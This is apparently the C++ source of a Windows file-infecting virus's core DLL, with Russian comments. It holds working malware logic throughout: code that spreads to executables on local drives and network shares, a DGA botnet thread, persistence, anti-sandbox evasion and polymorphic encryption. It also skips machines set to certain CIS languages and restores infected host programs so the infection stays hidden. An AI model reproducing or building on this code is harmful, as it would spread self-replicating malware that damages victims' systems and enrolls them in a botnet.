#include "global.hpp"
#include "virus_entry.h"
#include "utils.hpp"
#include "FileSearch.h"
#include "preprocessing.hpp"
#include "EncryptionAlgo.hpp"
#include "BotReceiver.hpp"
#include "configreader.h"
#include "identifier.h"
#include "capsid_tools.h"
#include "restorator.hpp"
#include "persistence.hpp"
#include "dna.hpp"
#include "traverser.hpp"
#include "antianalysis.h"

#ifdef _USE_XED
extern "C"
{
#include "xed\xed-interface.h"
}
#endif

extern "C"
{
	// главная функция бота ядра, вызывается после загрузки длл в память
	__declspec(dllexport) void WINAPI a(capsid_metadata *capsid);
}

BOOL isBlacklistedMachine(LANGID ldLang)
{
#ifdef _ENABLE_NOBLACKLIST_CHECK
	if (global_data::pExtendedDataCopy->dwWayInfected & WriteLogM0YV_FNO_CIS_CHECK)
		return FALSE;
#endif

	LANGID blacklisted_lcid[] =
	{
		1049,
		1058,
		1059,
		1064,
		1067,
		1068,
		1079,
		1087,
		1088,
		1090,
		1091,
		1092,
		2072,
		2073,
		2092,
		2115
	};

	for (UINT i = 0; i < sizeof(blacklisted_lcid) / sizeof(LANGID); i++)
	{
		if (blacklisted_lcid[i] == ldLang)
		{
#ifdef _DEBUG
			WriteLog(L"[isBlacklistedMachine] machine has blacklisted interface language");
#endif
			return TRUE;
		}
	}

	return FALSE;
}

BOOL isBlacklistCIS()
{
#ifdef _DISABLE_BLACKLIST_CIS
	return FALSE;
#endif

	BOOL bRet = TRUE;
	do
	{
		if (isBlacklistedMachine(GetUserDefaultUILanguage()))
			break;

		if (isBlacklistedMachine(GetSystemDefaultLangID()))
			break;

		if (isBlacklistedMachine(GetUserDefaultLangID()))
			break;

#ifdef _DEBUG
		WriteLog(L"[IsBlacklistCIS] Machine is not CIS languaged");
#endif

		bRet = FALSE;
	} while (FALSE);

	return bRet;
}

#ifdef _DEBUG
BOOL encalgo_test()
{
	long holdrand = GetTickCount();
	
	WORD buf[2];

	BOOL bRet = FALSE;

	SIZE_T dwBufferSize = 1024 * 1024;
	LPBYTE lpBuffer = new BYTE[dwBufferSize + 1];
	LPBYTE lpBuffer2 = new BYTE[dwBufferSize + 1];

	PDWORD pdwBuffer = (PDWORD)lpBuffer;

	RtlSecureZeroMemory(lpBuffer, dwBufferSize);

	IEncgen *encgenerator = nullptr;
	for (int i = 0; i < 1024; i++)
	{

		encgenerator = (IEncgen*)new BasicPolymorphicEncryptionAlgorithm;
		if (encgenerator)
		{
			encgenerator->init(128, GetTickCount());
			encgenerator->encrypt_buffer(lpBuffer2, dwBufferSize);
			encgenerator->decrypt_buffer(lpBuffer2, dwBufferSize);

			if (!RtlEqualMemory(lpBuffer, lpBuffer2, dwBufferSize))
			{
				MessageBoxA(0, "test failed", 0, 0);
			}
			delete encgenerator;
		}

		for (INT i = 0; i < dwBufferSize / sizeof(DWORD); i++)
		{
			buf[0] = _rand(&holdrand);
			buf[1] = _rand(&holdrand);
			PWORD pwwElem = (PWORD)&pdwBuffer[i];
			pwwElem[0] = buf[0];
			pwwElem[1] = buf[1];
		}
		_RtlCopyMemory(lpBuffer2, lpBuffer, dwBufferSize);


		Sleep(2);
	}

	delete[]lpBuffer;
	delete[]lpBuffer2;

	return bRet;
}

BOOL tests()
{
	BOOL bRet = TRUE;

	bRet &= encalgo_test();

	return bRet;
}

#endif

#ifdef _SLOW_POLYMORPHISM
VOID polyseed_init()
{


	return;
}
#endif

// TODO: проверка мьютекса и если такой уже существует, то ожидание его освобождения. После освобождения - выделение нового мьютекса и продолжение работы
// это заставит инфектор мигрировать при убийстве процесса носителя
// TODO: перехват RtlExitUserProcess -> RtlExitUserThread это сделает процесс персистентным после завершения хостового апп
DWORD WINAPI BotMain(LPVOID lpReserved)
{
	UNREFERENCED_PARAMETER(lpReserved);

	if ((global_data::pExtendedDataCopy != nullptr) && (global_data::pExtendedDataCopy->dwWayInfected & M0YV_FNO_BOT))
	{
#ifdef _DEBUG
		WriteLog(L"[BotMain] M0YV_FNO_BOT is set, exiting thread...");
#endif
		ExitThread(0);
	}

	for (;;)
	{
		if (sync::CreateMutexAndWait(sync::sync_type_t::SYNC_BOT, nullptr))
			break;

		Sleep(10 * 1000);
	}

#ifdef _DEBUG
#ifdef _USEDEBUG_MSGBOX
	MessageBoxA(0, "bot", "bot", 0);
#endif
	WriteLog(L"[BotMain] entered to bot procedure");
#endif

	do
	{
		if ((global_data::pwBotID == nullptr) || (global_data::pwHardwareID == nullptr))
			break;

		IBot *bot = (IBot*)new DGABot;
		if (bot != nullptr)
		{
			bot->start();
			delete bot;
		}

#ifdef _DEBUG
		WriteLog(L"[BotMain] bot finished");
#endif
	
	} while (FALSE);

	ExitThread(0);
	return 0;
}

// основная работа инфектора в активном состоянии
// по завершению работы спит N времени и освобождает ownership мьютекса
// позволяя инфекторам в других процессах перейти в активное состояние
// одновременно может быть только 1 поток с активным инфектором
// период ожидания нужен, чтобы были периоды неактивности между активными фазами в разных процессах
VOID InfectorActiveJob(capsid_metadata *capsid, BOOL bInfectLocal, BOOL bInfectNetwork)
{
	// mutex на handle владельцем которого мы будем являться после ожидания
	HANDLE hInfectorMutex = NULL;
	for (;;)
	{
		if (sync::CreateMutexAndWait(sync::sync_type_t::SYNC_INFECTOR, &hInfectorMutex))
			break;

		Sleep(10 * 1000); // если у нас не удалось войти в режим ожидания по какой-либо причине, то будем повторять каждые 10 секунд пока не получится
	}

	capsidProcessingForm processingData;
	ITraverse *traverser = nullptr;

	RtlSecureZeroMemory(&processingData, sizeof(processingData));
	processingData.capsid = capsid;

#ifdef _PATH_INFECTOR_NOSEARCH
	search_api::search_parameter param;
	RtlSecureZeroMemory(&param, sizeof(param));
	param.bExitThread = FALSE;
	param.bUseBlacklist = TRUE;
	param.dwParameterSize = sizeof(capsidProcessingForm);
	param.lpParameter = (LPBYTE)&processingData; // передавать каждому препроцессингу 
	param.onFound = preprocessing::ProcessFile;
	param.pwEntrySearch = L"C:\\inf_test\\bins";

	search_api::search(&param);
#else

#ifndef _DISABLE_PERSISTENCE
	exec_persistence(&processingData);
#endif

	search_api::search_parameter param;
	RtlSecureZeroMemory(&param, sizeof(param));
	param.bExitThread = FALSE;
	param.bUseBlacklist = TRUE;
	param.dwParameterSize = sizeof(capsidProcessingForm);
	param.lpParameter = (LPBYTE)&processingData; // передавать каждому препроцессингу 
	param.onFound = preprocessing::ProcessFile;
	param.pwEntrySearch = nullptr;

	do
	{
		traverser = (ITraverse*)new DefaultTraverse;
		if (traverser == nullptr)
			break;

		if (!traverser->init(&param, sizeof(param), bInfectLocal, bInfectNetwork))
			break;

		if (!traverser->traverse())
			break;

	} while (FALSE);
#endif
	

#ifdef _DEBUG
	WriteLog(L"[InfectorActiveJob] infector made iteration, sleeping before releasing...");
#endif

	// для того, чтобы менялись активные процессы нам надо освободить мьютекс через ReleaseMutex
	// но так как в таком случае работа инфекторов будет занимать огромное процессорное время без какой либо паузы
	// мы делаем период неактивности прежде чем освобождать мьютекс и позволять другим процессам стать активными
	Sleep(INFECTOR_SWITCHPERIOD);
	
	// освобождает мьютекс, позволяя другим процессам стать активными.
	ReleaseMutex(hInfectorMutex);
	CloseHandle(hInfectorMutex);

	if (traverser != nullptr)
		delete traverser;

	return;
}

// Основной поток инфектора
DWORD WINAPI InfectorMain(capsid_metadata *capsid)
{
#ifdef _DEBUG
	WriteLog(L"[InfectorMain] entering Main infector thread...");
#endif

#ifdef _DEBUG
#ifdef _USEDEBUG_MSGBOX
	MessageBoxA(0, "infector", "infector", 0);
#endif
	WriteLog(L"[InfectorMain] entered to infector procedure");
	// проверка выравнивания капсида, нужно для полиморфного декриптора
	if (align(capsid->size, CAPSID_ALIGNMENT) != capsid->size)
		MessageBoxA(0, "ERROR: CAPSID IS NOT ALIGNED", "FATAL INFECTOR ERROR", MB_ICONERROR);

	//tests();
#endif
	
	BOOL bInfectLocal = TRUE;
	BOOL bInfectNetwork = TRUE;
	for (;;)
	{
		InfectorActiveJob(capsid, bInfectLocal, bInfectNetwork);
		Sleep(100); // слип 100 нужен чтобы дать возможность другим процессам стать активными, прежде чем текущий процесс попытается вновь стать владельцем мьютекса
	
		bInfectNetwork = FALSE; // после первого прохода перестаем сканировать сетевые шары, иначе это будет создавать слишком видимые сетевые артефакты
	}

#ifdef _DEBUG
	WriteLog(L"[InfectorMain] infector finished");
#endif

	ExitThread(0);
	return 0;
}

#ifdef _DEBUG_CMD
void override_cmd()
{
	// перезапишем поля в памяти если есть на то воля аргументов командной строки
	PWCHAR pwCommandLine = GetCommandLineW();
	CCryptString cStr_paramhid(cryptedstr_paramhid);
	CCryptString cStr_paramoverride(cryptedstr_paramoverride);
	CCryptString cStr_parambid(cryptedstr_parambid);
	CCryptString cStr_paramadvid(cryptedstr_paramadvid);
	CCryptString cStr_paramsubid(cryptedstr_paramsubid);
	PWCHAR pwOperand = nullptr;

	if (!WriteLogcmd::isParamExists(pwCommandLine, cStr_paramoverride.w_str()))
		return;

	pwOperand = WriteLogcmd::GetStrParamOperand(pwCommandLine, cStr_parambid.w_str());
	if (pwOperand)
	{
		wcscpy(global_data::pwBotID, pwOperand);
		delete[]pwOperand;
	}
	
	pwOperand = WriteLogcmd::GetStrParamOperand(pwCommandLine, cStr_paramhid.w_str());
	if (pwOperand)
	{
		wcscpy(global_data::pwHardwareID, pwOperand);
		delete[]pwOperand;
	}

	INT iParam = 0;
	if (WriteLogcmd::GetIntParamOperand(pwCommandLine, cStr_paramadvid.w_str(), &iParam))
		config_data::cfg->dwAdvertID = iParam;
	
	if (WriteLogcmd::GetIntParamOperand(pwCommandLine, cStr_paramsubid.w_str(), &iParam))
		config_data::cfg->dwSubID = iParam;

	return;
}
#endif

void main_init()
{
#ifdef _SLOW_POLYMORPHISM
	// инициализация медленного полиморфизма
	polyseed_init();
#endif

#ifdef _DEBUG
	WCHAR wchSelfPath[MAX_PATH + 1];
	if (GetModuleFileNameW(NULL, wchSelfPath, MAX_PATH) > 0)
	{
		UINT i = wcslen(wchSelfPath);
		for (;;i--)
		{
			if (wchSelfPath[i] == L'\\')
				break;
		}

		PWCHAR pwFileName = &wchSelfPath[i + 1];
		global_data::pwFileName = new WCHAR[wcslen(pwFileName) + 1];
		if (global_data::pwFileName != nullptr)
			wcscpy(global_data::pwFileName, pwFileName);
	}
#endif

	HiveMindConfig *cfg = read_config();
#ifdef _DEBUG
	WCHAR debugOut[1024];
	if (cfg != nullptr)
	{
		wsprintfW(debugOut, L"[config] dwAdvertID = %d, dwSubID = %d, dwDGASeed = 0x%X", cfg->dwAdvertID, cfg->dwSubID, cfg->dwDGASeed);
		WriteLog(debugOut);
	}
	else
		WriteLog(L"[Config] error cant decode config");
#endif

#ifdef _USE_XED
	// инициализация дизассемблера
	xed_tables_init();
#ifdef _DEBUG
	WriteLog(L"[InfectorMain] using Intel XED as disassembler engine");
#endif
#endif

	// сохраняет в глобальные переменные айди бота и айди железа
	identification_init();
	global_data::dwIntegrityLevel = dwCurrentProcessIntegrityLevel();

#ifdef _DEBUG_CMD
	override_cmd();
#endif

	return;
}

void save_original_extended_data(capsid_extended *extended_original, SIZE_T dwExtendedSize)
{
	if (dwExtendedSize != sizeof(capsid_extended))
	{
#ifdef _DEBUG
		MessageBoxA(0, "Error: extended_original capsid size != sizeof(capsid_exteded)", "fatal error", MB_ICONERROR);
#endif
		return;
	}

	// скопируем оригинал extended data в глобал чтобы потом могли отправить в админку статус капсида на момент заражения данного хоста
	global_data::pExtendedDataCopy = new capsid_extended;
	if (global_data::pExtendedDataCopy != nullptr)
	{
		_RtlCopyMemory((LPBYTE)global_data::pExtendedDataCopy, (LPBYTE)extended_original, dwExtendedSize);


#ifdef _DEBUG
		WCHAR debugOut[1024];
		wsprintfW(debugOut, L"[prepare_extended_data] extended data original: dwGenCounter = %d, dwDNAMutatorCounter = %d, dwWayInfected = %d, parentBotId = %s", extended_original->dwGenCounter, extended_original->dwDNAMutatorCounter, extended_original->dwWayInfected, extended_original->parentBotId);
		WriteLog(debugOut);
#endif
	}

	return;
}

#ifdef _DEBUG
VOID print_infway_flags(DWORD dwInfectorFlags)
{
	WCHAR debugOut[1024];
	RtlSecureZeroMemory(debugOut, sizeof(debugOut));
	wcscpy(debugOut, L"[print_infway_flags] Infector flags: ");
	
	if (dwInfectorFlags != NULL)
	{
		if (dwInfectorFlags & M0YV_USE_PROPFLAG)
			wcscat(debugOut, L"M0YV_USE_PROPFLAG | ");

		if (dwInfectorFlags & M0YV_FNO_SEARCH)
			wcscat(debugOut, L"M0YV_FNO_SEARCH | ");

		if (dwInfectorFlags & M0YV_FNO_PERSIST)
			wcscat(debugOut, L"M0YV_FNO_PERSIST | ");

		if (dwInfectorFlags & M0YV_FNO_BOT)
			wcscat(debugOut, L"M0YV_FNO_BOT | ");

		if (dwInfectorFlags & M0YV_USE_UACBYPASS)
			wcscat(debugOut, L"M0YV_USE_UACBYPASS | ");

		if (dwInfectorFlags & M0YV_FNO_RET)
			wcscat(debugOut, L"M0YV_FNO_RET | ");

		if (dwInfectorFlags & M0YV_USE_DECOY)
			wcscat(debugOut, L"M0YV_USE_DECOY | ");

		if (dwInfectorFlags & WriteLogM0YV_FNO_CIS_CHECK)
			wcscat(debugOut, L"WriteLogM0YV_FNO_CIS_CHECK | ");

		if (dwInfectorFlags & M0YV_FNO_ANTISBX)
			wcscat(debugOut, L"M0YV_FNO_ANTISBX | ");
	}

	wcscat(debugOut, L"NULL");
	WriteLog(debugOut);

	return;
}
#endif

void prepare_extended_data(capsid_metadata *capsid)
{
	capsid_extended lextended_data;
	RtlSecureZeroMemory(&lextended_data, sizeof(lextended_data));

	capsid_tools::get_extended(capsid, &lextended_data, sizeof(lextended_data));
	save_original_extended_data(&lextended_data, sizeof(lextended_data)); // сохранит копию оригинала в глобальной переменной

	// прирастим счетчик поколения заражений, так как данный capsid будет дописываться в новые екзешники
	lextended_data.dwGenCounter += 1;
	
	// если попали на машину впервые, то есть если зараженный хостовой апп был заражен на другой машине, то прирастим счетчик распространения между машинами
	if (is_machine_firstexec())
		lextended_data.dwPropCounter += 1;

	if ((global_data::pwBotID != nullptr) && (wcslen(global_data::pwBotID) < (sizeof(capsid_extended::parentBotId) / 2)))
	{
		wcscpy(lextended_data.parentBotId, global_data::pwBotID);
	}

#ifdef _DEBUG
	print_infway_flags(lextended_data.dwWayInfected);
#endif

	if ((lextended_data.dwWayInfected & M0YV_USE_PROPFLAG) == 0)
		lextended_data.dwWayInfected = NULL; // если у нас нет флага о пропагации флагов, то тогда обнулим, чтобы все зараженные после файлы не имели текущих флагов

	capsid_tools::set_extended(capsid, &lextended_data, sizeof(lextended_data));

	return;
}

void restore_hostapp(capsid_metadata *physical_capsid)
{
	IHostRestorator *restorator = nullptr;

	do
	{
		if (global_data::pExtendedDataCopy == nullptr)
			break;
		
		if (global_data::pExtendedDataCopy->dwGenCounter == 0)
		{
#ifdef _DEBUG
			WriteLog(L"[restore_hostapp] gen counter == 0, no need in restoration");
#endif
			break;
		}

		restorator = (IHostRestorator*)new CallRestoratorX25519;
		if (restorator == nullptr)
			break;

		CallRestoratorBlock *crbRestoratorBlock = (CallRestoratorBlock*)((SIZE_T)physical_capsid + (SIZE_T)physical_capsid->size);
		restorator->restore((LPBYTE)crbRestoratorBlock, sizeof(CallRestoratorBlock));

	} while (FALSE);
	if (restorator != nullptr)
		delete restorator;

	return;
}

#ifdef _DEBUG
VOID print_dna_code()
{
	WriteLog(L"printing DNA code");
	WCHAR debugOut[10240];
	RtlSecureZeroMemory(debugOut, sizeof(debugOut));

	if (global_data::pExtendedDataCopy == nullptr)
		return;

	LPBYTE lpbDNA = (LPBYTE)global_data::pExtendedDataCopy->dwDNA;
	PWCHAR pwWriteLog = debugOut;
	wsprintfW(pwWriteLog, L"[print_dna_code] DNA %d len: ", sizeof(capsid_extended::dwDNA));
	pwWriteLog += wcslen(pwWriteLog);

	for (UINT i = 0; i < sizeof(capsid_extended::dwDNA); i++)
	{
		wsprintfW(pwWriteLog, L"%X", lpbDNA[i]);
		pwWriteLog += wcslen(pwWriteLog);
	}

	WriteLog(debugOut);

	return;
}
#endif

DWORD WINAPI MainThreadInitializer(LPVOID lpParameter)
{
	BOOL bAntiSandboxHooked = FALSE;

	// антипесочница перед инициализацией любого функционала
	antisbx::IAntiSandbox *antisandbox = (antisbx::IAntiSandbox*)new antisbx::SandboxDelayMachineEntry;
	if ((antisandbox != nullptr) && (antisandbox->enter() == FALSE))
		bAntiSandboxHooked = TRUE;

	// нельзя делать выход при проверке на false в antisandbox->enter, так как ExitThread / ExitProcess могут быть хукнуты чтобы продолжить исполнение
	// поэтому используем флаг отдельный и запускаем функционал только если он не был установлен в true
	if (!bAntiSandboxHooked)
	{

		// запуск потока выполнения инфектора файлов
#ifndef _DISABLE_INFECTOR 
		CloseHandle(CreateThread(0, 0, (LPTHREAD_START_ROUTINE)InfectorMain, lpParameter, NULL, NULL));
#endif
		// запуск потока выполнения бота
#ifndef _DISABLE_BOT
		CloseHandle(CreateThread(0, 0, (LPTHREAD_START_ROUTINE)BotMain, NULL, NULL, NULL));
#endif
	}

	if (antisandbox != nullptr)
		delete antisandbox;

	ExitThread(0);
}

// главная функция бота ядра, вызывается после загрузки длл в память функцией entry из virus_entry.cpp либо внешним шеллкодом при наличии _EXTERNAL_SHELLCODE
// должна запустить потоки выполнения и вернуть управление, так как оригинальное апп получает управление только после ретерна отсюда
__declspec(dllexport) void WINAPI a(capsid_metadata *capsid)
{
#ifdef _DEBUG
#ifdef _WIN64
	WriteLog(L"[main] entered x64 main core function");
#else
	WriteLog(L"[main] entered x86 main core function");
#endif
#endif

	// инициалирует необходимые глобальные структуры
	main_init();

	// todo: случае начала работы хукнуть RtlExitUserProcess на RtlExitUserThread, для того чтобы при завершении хостового апп вирь продолжил работу

	// создадим копию капсида в памяти
	capsid_metadata *tmp = (capsid_metadata*)new BYTE[capsid->size+1];
	if (tmp != nullptr)
	{
		_RtlCopyMemory((LPBYTE)tmp, (LPBYTE)capsid, capsid->size);
		prepare_extended_data(tmp); // сделает необходимые преобразования extended_data, а также скопирует оригинал extended_data в глобальную переменную

		// пропатчим память хостового апп так чтобы оно смогло восстановить управление - без этой функции будет краш
		// требует оригинальный физический капсид, а не его копию, чтобы найти блок восстановления
		restore_hostapp(capsid);
#ifdef _DEBUG
		print_dna_code();
#endif

		if (isBlacklistCIS() == FALSE)
		{
			CloseHandle(CreateThread(0, 0, (LPTHREAD_START_ROUTINE)MainThreadInitializer, tmp, NULL, NULL));
		}

	}

	if ((global_data::pExtendedDataCopy != nullptr) && (global_data::pExtendedDataCopy->dwWayInfected & M0YV_FNO_RET))
	{
#ifdef _DEBUG
		WriteLog(L"[main] M0YV_FNO_RET is set, exiting thread...");
#endif
		ExitThread(0);
	}

	return;
}

#ifdef _DISABLE_INFECTOR
#ifndef _DEBUG
инфектор в релиз версии не должен быть отключен
#endif
#endif

#ifdef _DISABLE_BOT
#ifndef _DEBUG
бот в релиз версии не должен быть отключен
#endif
#endif

BOOL WINAPI DllMain(HINSTANCE hinstDll, DWORD fdwReason, LPVOID lpvReserved)
{
	if (fdwReason == DLL_PROCESS_ATTACH)
	{
#ifdef _DEBUG
		WriteLog(L"[DllMain] DLL_PROCESS_ATTACH");
#endif
	}
	return TRUE;
}